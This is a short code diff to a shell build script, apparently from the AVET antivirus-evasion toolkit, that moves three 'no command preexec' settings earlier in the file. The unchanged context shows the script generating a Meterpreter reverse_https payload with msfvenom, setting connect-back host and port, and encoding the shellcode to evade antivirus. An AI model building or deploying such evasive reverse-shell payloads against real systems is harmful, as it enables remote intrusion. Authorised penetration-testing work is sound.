@@ -25,6 +25,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
 # enable debug output
 enable_debug_print
 #CONFIGURATION_END
@@ -36,10 +39,6 @@ msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/s
 
 # Apply AVET encoding via format.sh tool
 encode_payload avet input/sc_c.txt output/scenc_raw.txt
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source dynamic_from_file
